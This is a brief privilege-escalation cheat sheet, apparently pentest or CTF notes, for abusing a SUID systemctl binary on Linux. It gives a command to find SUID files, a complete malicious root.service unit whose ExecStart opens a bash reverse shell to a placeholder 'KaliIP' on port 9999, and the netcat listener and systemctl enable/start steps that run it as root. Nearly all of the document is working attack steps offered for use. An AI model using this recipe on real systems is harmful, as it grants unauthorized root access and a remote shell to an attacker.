Identification :



**find / -type f -perm -04000 -ls 2>/dev/null**


Exploitation for systemctl 
create a file called root.service with contents

"
[Unit]
Description=roooooooooot

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/KaliIP/9999 0>&1'

[Install]
WantedBy=multi-user.target
"
start nc listener on 9999

`/bin/systemctl enable path_to_root.service`

`/bin/systemctl start root`


Links 
1) https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49
2) https://www.codegrepper.com/code-examples/shell/suid+privilege+escalation+systemctl
3) https://gtfobins.github.io/


